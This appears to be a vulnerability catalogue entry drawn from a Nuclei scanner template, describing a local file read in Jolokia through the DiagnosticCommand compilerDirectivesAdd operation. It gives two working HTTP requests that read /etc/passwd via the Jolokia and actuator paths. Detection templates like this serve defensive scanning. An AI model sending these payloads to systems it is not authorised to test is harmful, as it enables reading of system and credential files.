# Vulnerability: Jolokia - CompilerDirectivesAdd File Read
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`jolokia-file-read-compilerdirectivesadd.yaml`)

## Description
Jolokia is vulnerable to local file inclusion via compilerDirectivesAdd.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
GET {{BaseURL}}/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
```

